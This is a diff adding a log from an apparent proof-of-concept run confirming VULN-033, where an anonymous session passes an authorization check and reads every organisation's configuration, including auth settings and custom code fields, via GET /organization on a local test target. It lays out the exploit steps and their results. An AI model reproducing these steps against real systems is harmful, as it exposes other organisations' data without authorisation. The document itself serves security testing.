@@ -1,0 +1,16 @@
+========================================================================
+VULN-033: Any/anon session reads full org config via GET /organization
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route organization.ts:103 gated by authOrApiKeyMiddleware -> ANY session passes
+[STEP] baseline: GET /organization with NO cookie
+[INFO]   no-cookie GET /organization -> HTTP 401
+[SETUP] minting an anonymous session (VULN-018) — no account, no org membership
+[SETUP] anon user=b00e485a-52d4-4133-98b6-d050d2cbc5c9 isAnonymous=True orgRoles={}  (NOT a member of any org)
+[STEP] GET /organization with the anonymous session cookie
+[INFO]   anon GET /organization -> HTTP 200
+[INFO]   anon received 8 org config row(s); siteNames=['cve-hunt-academy', 'probe3f8bad', 'capd6eac2', 'capfe3c55', 'cap85004d', 'probe2a325e', 'cap5aa164', 'probef3eeab']
+[INFO]   auth-posture/config keys exposed: ['siteName', 'disableEmailPassword', 'disableGoogleAuth', 'disableSignup', 'settings', 'customCode', 'aiTutorSettings']
+[PROOF] no-cookie=401 but anon session=200 returning 8 org config row(s) with auth-posture/settings fields ['siteName', 'disableEmailPassword', 'disableGoogleAuth', 'disableSignup', 'settings', 'customCode', 'aiTutorSettings'] — an unauthenticated actor read org configuration (cross-org enumeration: ['cve-hunt-academy', 'probe3f8bad', 'capd6eac2', 'capfe3c55', 'cap85004d', 'probe2a325e', 'cap5aa164', 'probef3eeab'])
+==> VULN-033: CONFIRMED — anon session reads full org config via GET /organization
+[OK] exploit confirmed — org auth-posture + settings disclosed to an anonymous session
